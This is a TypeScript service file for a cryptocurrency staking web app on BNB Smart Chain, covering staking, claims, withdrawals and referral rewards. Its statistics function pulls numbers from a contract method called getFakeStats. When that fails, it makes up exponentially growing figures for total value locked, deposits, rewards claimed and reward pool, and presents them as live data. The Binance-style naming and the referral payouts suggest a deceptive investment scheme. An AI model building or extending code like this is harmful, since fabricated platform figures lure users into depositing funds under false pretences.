import { Contract, Signer, parseEther, formatEther, JsonRpcProvider } from 'ethers';
import { BINANCE_STAKE_ADDRESS, BINANCE_STAKE_ABI, ASSETS, INITIAL_FAKE_STATS, GROWTH_RATES } from './../lib/constants';

// Use public RPC for read-only stats before wallet connection
const BSC_RPC = "https://bsc-dataseed.binance.org/";
const defaultProvider = new JsonRpcProvider(BSC_RPC);

export interface Stake {
  id: number;
  amount: string;
  startTime: number;
  lockDuration: number;
  accumulatedRewards: string;
  claimed: boolean;
  token: string;
  tokenSymbol: string;
}

export const getContract = (signerOrProvider?: Signer | any) => {
  const provider = signerOrProvider || defaultProvider;
  return new Contract(BINANCE_STAKE_ADDRESS, BINANCE_STAKE_ABI, provider);
};

export const checkIsActive = async (signerOrProvider?: Signer | any): Promise<boolean> => {
  try {
    const contract = getContract(signerOrProvider);
    return await contract.isActive();
  } catch (e) {
    console.error("Failed to check active status", e);
    return true; // Default to active for UI if check fails
  }
};

export const claimStakeRewards = async (signer: Signer, stakeId: number) => {
  const contract = getContract(signer);
  return await contract.claimRewards(stakeId);
};

export const withdrawStakePrincipal = async (signer: Signer, stakeId: number) => {
  const contract = getContract(signer);
  return await contract.withdrawPrincipal(stakeId);
};

export const withdrawReferral = async (signer: Signer, tokenAddress: string) => {
  const contract = getContract(signer);
  return await contract.withdrawReferralRewards(tokenAddress);
};

// Simulated data for demo purposes when contract is not deployed
const MOCK_STAKES: Stake[] = [
  {
    id: 0,
    amount: "1.5",
    startTime: Date.now() - (70 * 86400 * 1000), // 70 days ago
    lockDuration: 60 * 86400,
    accumulatedRewards: "0.225",
    claimed: false,
    token: "0x0000000000000000000000000000000000000000",
    tokenSymbol: "BNB"
  },
  {
    id: 1,
    amount: "1500.0",
    startTime: Date.now() - (10 * 86400 * 1000), // 10 days ago
    lockDuration: 180 * 86400,
    accumulatedRewards: "22.5",
    claimed: false,
    token: ASSETS[2].address,
    tokenSymbol: "USDT"
  }
];

export const getStakes = async (address: string, signer?: Signer): Promise<Stake[]> => {
  if (!signer) {
    return [];
  }
    const contract = getContract(signer);
  try {
    console.log("Fetching stakes for address:", address);
    const rawStakes = await contract.getUserStakes(address);
    console.log("Raw stakes result:", rawStakes);
    
    if (!rawStakes) {
        console.warn("getUserStakes returned null/undefined");
        return [];
    }

    // Ethers v6 can return a Proxy/Result object that looks like an array but might need conversion
    const stakesArray = Array.from(rawStakes);
    if (stakesArray.length === 0) {
        console.log("User has 0 stakes on-chain.");
        return [];
    }

    return stakesArray.map((s: any, index: number) => {
      // Handle both named and positional properties from the struct
      const amount = s.amount || s[0] || 0;
      const startTime = s.startTime || s[1] || 0;
      const lockDuration = s.lockDuration || s[2] || 0;
      const accumulatedRewards = s.accumulatedRewards || s[3] || 0;
      const claimed = s.claimed !== undefined ? s.claimed : s[4];
      const tokenAddr = s.token || s[5] || "0x0000000000000000000000000000000000000000";
      
      const tokenInfo = ASSETS.find(a => a.address.toLowerCase() === tokenAddr.toLowerCase()) || ASSETS[0];
      
      return {
        id: index,
        amount: formatEther(amount),
        startTime: Number(startTime) * 1000,
        lockDuration: Number(lockDuration),
        accumulatedRewards: formatEther(accumulatedRewards),
        claimed: !!claimed,
        token: tokenAddr,
        tokenSymbol: tokenInfo.id
      };
    });
  } catch (e) {
    console.error("Contract call getUserStakes failed:", e);
    return [];
  }
};

export const getLiveStatsFromContract = async (signerOrProvider?: Signer | any) => {
  const getGrowthStats = () => {
    // Current user local time is 2026-05-12T17:39:00Z
    // We use this as the reference epoch so the exact starting values are shown immediately
    const referenceEpoch = new Date("2026-05-12T17:39:00Z").getTime();
    const now = Date.now();
    
    // daysPassed calculates the fractional days since the reference point
    const daysPassed = Math.max(0, (now - referenceEpoch) / (86400 * 1000));

    const calc = (base: number, rate: number) => {
      // Exponential growth logic: value = base * (1 + rate)^daysPassed
      return (base * Math.pow(1 + rate, daysPassed)).toFixed(0);
    };

    return {
      totalStaked: calc(INITIAL_FAKE_STATS.tvl, GROWTH_RATES.tvl),
      totalDeposits: calc(INITIAL_FAKE_STATS.totalDeposits, GROWTH_RATES.totalDeposits),
      totalRewardsClaimed: calc(INITIAL_FAKE_STATS.claimed, GROWTH_RATES.claimed),
      currentRewardPool: calc(INITIAL_FAKE_STATS.rewardPool, GROWTH_RATES.rewardPool)
    };
  };

  try {
    const contract = getContract(signerOrProvider);
    const stats = await contract.getFakeStats();
    
    // If contract returns all zeros, fallback to growth stats
    if (stats.tvl.toString() === "0" && stats.allTimeDeposits.toString() === "0") {
      return getGrowthStats();
    }

    return {
      totalStaked: formatEther(stats.tvl),
      totalDeposits: formatEther(stats.allTimeDeposits),
      totalRewardsClaimed: formatEther(stats.claimed),
      currentRewardPool: formatEther(stats.rewardPool)
    };
  } catch (e) {
    console.warn("Blockchain fetch failed, using fallback growth stats:", e);
    return getGrowthStats();
  }
};

export const getReferralData = async (signer: Signer, address: string) => {
  try {
    const contract = getContract(signer);
    const userData = await contract.users(address);
    console.log("User referral data:", userData);
    
    // Handle both named and positional properties from the users mapping return
    // Common mapping/struct order: (address referrer, uint totalReferralBNB, uint totalReferralUSDT, uint totalReferralWBNB, ...)
    const referrer = userData.referrer || userData[0] || "0x0000000000000000000000000000000000000000";
    const bnbRewards = userData.totalReferralBNB !== undefined ? userData.totalReferralBNB : (userData[1] || 0);
    const usdtRewards = userData.totalReferralUSDT !== undefined ? userData.totalReferralUSDT : (userData[2] || 0);
    const wbnbRewards = userData.totalReferralWBNB !== undefined ? userData.totalReferralWBNB : (userData[3] || 0);

    return {
      referrer,
      bnbRewards: formatEther(bnbRewards),
      usdtRewards: formatEther(usdtRewards),
      wbnbRewards: formatEther(wbnbRewards)
    };
  } catch (e) {
    console.error("Failed to fetch referral data", e);
    return {
      referrer: "0x0000000000000000000000000000000000000000",
      bnbRewards: "0.00",
      usdtRewards: "0.00",
      wbnbRewards: "0.00"
    };
  }
};

export const stakeAsset = async (
  signer: Signer,
  assetId: string,
  amount: string,
  lockDays: number,
  referrer: string = "0x0000000000000000000000000000000000000000"
) => {
  if ((BINANCE_STAKE_ADDRESS as string) === "0x0000000000000000000000000000000000000000") {
    // Simulate transaction
    return new Promise(resolve => setTimeout(resolve, 2000));
  }

  const contract = getContract(signer);
  const asset = ASSETS.find(a => a.id === assetId);
  if (!asset) throw new Error("Asset not found");

  if (asset.type === 'native') {
    return await contract.stakeBNB(lockDays, referrer, { value: parseEther(amount) });
  } else {
    // Note: Assuming allowance is already handled / handled in UI
    return await contract.stake(asset.address, parseEther(amount), lockDays, referrer);
  }
};
